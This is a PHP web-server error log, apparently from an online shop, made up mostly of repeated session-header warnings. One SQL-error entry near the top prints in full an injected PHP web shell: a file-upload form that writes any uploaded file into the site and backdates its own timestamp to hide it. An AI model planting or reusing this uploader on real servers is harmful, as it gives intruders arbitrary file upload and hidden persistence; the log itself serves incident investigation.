2016-05-03 15:57:53 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-03 15:57:54 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-03 15:57:54 - PHP Notice:  Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '﻿<html> 
<head> 
<meta http-equiv="Content-Type" content="text/html; charset' at line 1<br />Error No: 1064<br />﻿<html> 
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=windows-utf-8"> 
<title>utf</title> 
</head> 
<body> 
<?php 
echo "<h1>Welcome</h1>\n"; 
echo "IP: "; 
echo $_SERVER['REMOTE_ADDR']; 
echo "<form method=\"post\" enctype=\"multipart/form-data\">\n"; 
echo "<input type=\"file\" name=\"newfile\"><br> \n"; 
echo "<input type=\"submit\" value=\"OK\"><br>\n"; 
echo "</form>\n"; 
if(is_uploaded_file($_FILES["newfile"]["tmp_name"])) 
    { 
    move_uploaded_file($_FILES["newfile"]["tmp_name"], $_FILES["newfile"]["name"]); 
    $file = $_FILES["newfile"]["name"]; 
    echo "<a href=\"$file\">$file</a>"; 
    } else { 
    echo("empty"); 
    } 
$newfile = $_SERVER[SCRIPT_FILENAME]; 
$time = time() - 105360688; 
touch($newfile, $time); 
?> 
</body> 
</html> in /home2/goldglas/public_html/system/database/mysql.php on line 50
2016-05-03 17:10:11 - 
2016-05-03 17:10:12 - 
2016-05-03 17:10:12 - 
2016-05-03 17:10:12 - 
2016-05-03 17:10:12 - 
2016-05-03 17:39:48 - 
2016-05-03 17:39:48 - 
2016-05-03 17:39:48 - 
2016-05-03 17:39:48 - 
2016-05-03 17:39:48 - 
2016-05-03 18:23:16 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-03 18:23:16 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-03 18:23:16 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 2:50:13 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 2:50:13 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 2:50:13 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 4:21:05 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 4:21:05 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 4:21:05 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 4:21:05 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 4:21:05 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 4:21:25 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 4:21:25 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 4:21:25 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 4:21:25 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 4:21:25 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 5:06:32 - 
2016-05-04 5:06:32 - 
2016-05-04 5:06:32 - 
2016-05-04 5:06:32 - 
2016-05-04 5:06:32 - 
2016-05-04 6:32:02 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 6:32:02 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 6:32:02 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 6:32:02 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 6:32:02 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 6:53:07 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 6:53:07 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 6:53:07 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 6:53:07 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 6:53:07 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 7:45:13 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 7:45:13 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 7:45:13 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 7:56:38 - 
2016-05-04 7:56:38 - 
2016-05-04 7:56:38 - 
2016-05-04 7:56:38 - 
2016-05-04 7:56:38 - 
2016-05-04 8:24:00 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 8:24:00 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 8:24:00 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 8:24:00 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 8:24:00 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 8:24:24 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 8:24:24 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 8:24:24 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 8:24:24 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 8:24:24 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 9:17:19 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 9:17:19 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 9:17:19 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 9:17:19 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 9:17:19 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 9:22:54 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 9:22:54 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 9:22:54 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 9:22:54 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 9:22:54 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 9:44:19 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 9:44:19 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 9:44:19 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 9:44:19 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 9:44:19 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 9:49:50 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 9:49:50 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 9:49:50 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 9:49:50 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 9:49:50 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_controller.php on line 28
2016-05-04 9:49:50 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_controller.php on line 29
2016-05-04 12:29:48 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 12:29:48 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 12:29:48 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 14:36:14 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 14:36:14 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 14:36:14 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 14:36:14 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 14:36:14 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 16:04:58 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 16:04:58 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 16:04:58 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 16:04:58 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 16:04:58 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 17:20:39 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 17:20:39 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 17:20:39 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 17:23:30 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 17:23:30 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 17:23:30 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 17:23:30 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 17:23:30 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 17:49:39 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 17:49:39 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 17:49:39 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 17:49:39 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 17:49:39 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 18:00:26 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 18:00:26 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 18:00:26 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 18:00:26 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 18:00:26 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 18:32:39 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 18:32:39 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 18:32:39 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 18:32:39 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 18:32:39 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 18:42:14 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 18:42:14 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 18:42:14 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 18:42:14 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 18:42:14 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 18:42:15 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 18:42:15 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 18:42:15 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 18:42:15 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 18:42:15 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 18:47:53 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 18:47:53 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 18:47:53 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 18:47:53 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 18:47:53 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 19:02:42 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 19:02:42 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 19:02:42 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 19:02:42 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 19:02:42 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 19:06:06 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 19:06:06 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 19:06:06 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 19:06:06 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 19:06:06 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 19:06:20 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 19:06:20 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 19:06:20 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 19:06:20 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 19:06:20 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 19:42:41 - 
2016-05-04 19:42:41 - 
2016-05-04 19:42:41 - 
2016-05-04 19:42:41 - 
2016-05-04 19:42:41 - 
2016-05-04 19:47:00 - 
2016-05-04 19:47:00 - 
2016-05-04 19:47:00 - 
2016-05-04 19:47:00 - 
2016-05-04 19:47:00 - 
2016-05-04 21:15:04 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 21:15:04 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 21:15:04 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 21:15:04 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 21:15:04 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-04 21:19:40 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 21:19:40 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 21:19:40 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 21:19:40 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 21:19:40 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_controller.php on line 28
2016-05-04 21:19:40 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_controller.php on line 29
2016-05-04 22:20:09 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 22:20:09 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 22:20:09 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 23:22:03 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 23:22:03 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-04 23:22:03 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-04 23:22:03 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-04 23:22:03 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-05 0:13:01 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 0:13:01 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 0:13:01 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-05 0:13:01 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-05 0:13:01 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-05 0:22:35 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 0:22:35 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 0:22:35 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-05 0:22:35 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-05 0:22:35 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-05 0:22:36 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
